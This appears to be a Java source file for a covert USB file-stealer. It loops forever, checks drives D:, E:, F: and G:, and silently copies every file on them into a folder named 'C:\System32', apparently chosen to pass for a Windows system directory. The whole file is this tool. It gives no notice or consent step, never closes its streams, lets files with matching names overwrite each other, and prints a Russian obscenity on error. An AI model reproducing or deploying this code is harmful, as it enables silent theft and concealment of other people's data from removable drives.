import java.io.*;
import java.nio.file.Files;
import java.util.Random;

public class Main {
    public static final String PLACE_TO_SAVE = "C:\\System32";
    public static Random random = new Random();
    public static File fileGeneration (File entry){
        try {
            new File (PLACE_TO_SAVE + "\\" + entry.getName()).createNewFile();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        return new File(PLACE_TO_SAVE + "\\" + entry.getName());
    }

    public static void processFilesFromFolder(File folder)
    {
        File[] folderEntries = folder.listFiles();
        for (File entry : folderEntries)
        {
            if (entry.isDirectory())
            {
                processFilesFromFolder(entry);
                continue;
            }
            FileInputStream is = null;
            try {
                is = new FileInputStream(entry);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            FileOutputStream os = null;
            try {
                os = new FileOutputStream(fileGeneration(entry));
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            byte[] buffer = new byte[1024];
                int length;
                try{
                    while ((length = is.read(buffer)) > 0) {
                        os.write(buffer, 0, length);
                    }
                }
                catch (IOException ioException){
                    System.out.print("Пиздец!");
                }
        }
    }
    public static void main(String args[]){
        String location = new String();
        location = "G:";
        String location1 = new String();
        location1 = "D:";
        String location2 = new String();
        location2 = "E:";
        String location3 = new String();
        location3 = "F:";
        while (true){
            if (new File(location).exists ()){
                File usb = new File(location);processFilesFromFolder(usb);
            }
            if (new File(location1).exists ()){
                File usb = new File(location1);processFilesFromFolder(usb);
            }
            if (new File(location2).exists ()){
                File usb = new File(location2);processFilesFromFolder(usb);
            }
            if (new File(location3).exists ()){
                File usb = new File(location3);processFilesFromFolder(usb);
            }
        }
    }

}
